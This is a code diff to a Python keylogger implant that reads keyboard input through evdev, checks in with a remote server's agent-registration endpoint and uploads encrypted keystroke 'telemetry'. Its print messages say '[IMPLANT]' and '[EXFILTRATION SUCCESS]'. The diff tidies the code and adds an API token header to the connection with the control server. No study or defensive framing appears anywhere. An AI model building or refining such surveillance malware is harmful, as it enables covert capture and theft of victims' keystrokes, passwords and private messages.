@@ -3,7 +3,7 @@ import socket
 import asyncio
 from datetime import UTC, datetime
 import httpx
-from evdev import InputDevice, categorize, ecodes, list_devices
+from evdev import InputDevice, ecodes, list_devices
 from crypto_vault import CryptoVault
 from pydantic_settings import BaseSettings, SettingsConfigDict
 from pydantic import Field
@@ -15,6 +15,7 @@ CLIENT_ID = f"linux-{HOSTNAME}"
 
 class Settings(BaseSettings):
     colossus_shared_key: str = Field(default="placeholder_key_if_env_is_missing")
+    argus_api_token: str = Field(default="placeholder_key_if_env_is_missing")
 
     model_config = SettingsConfigDict(env_file=".env", extra="ignore")
 
@@ -42,7 +43,7 @@ async def register_agent(client: httpx.AsyncClient) -> bool:
     try:
         res = await client.post("/api/v1/agent/register", json=payload)
         if res.status_code in (200, 201):
-            print(f"[IMPLANT] Check-In Success. Server signature recognized.")
+            print("[IMPLANT] Check-In Success. Server signature recognized.")
             return True
         print(f"[ERROR] Registry signature rejected: {res.status_code}")
         return False
@@ -66,7 +67,7 @@ async def upload_telemetry(client: httpx.AsyncClient, text_block: str):
     try:
         res = await client.post("/api/v1/agent/telemetry", json=payload)
         if res.status_code == 202:
-            print(f"[EXFILTRATION SUCCESS] Encrypted bytes flushed over network.")
+            print("[EXFILTRATION SUCCESS] Encrypted bytes flushed over network.")
         else:
             print(f"[ERROR] Server processing anomaly: {res.status_code}")
     except Exception as e:
@@ -80,7 +81,8 @@ async def log_keys(device):
     print("Press ESC  to server connections...")
 
     # Establish a persistent async network connection reuse client wrapper
-    async with httpx.AsyncClient(base_url=SERVER_URL) as client:
+    headers = {"X-Argus-Token": settings.argus_api_token}
+    async with httpx.AsyncClient(base_url=SERVER_URL, headers=headers) as client:
         await register_agent(client)
 
         async for event in device.async_read_loop():
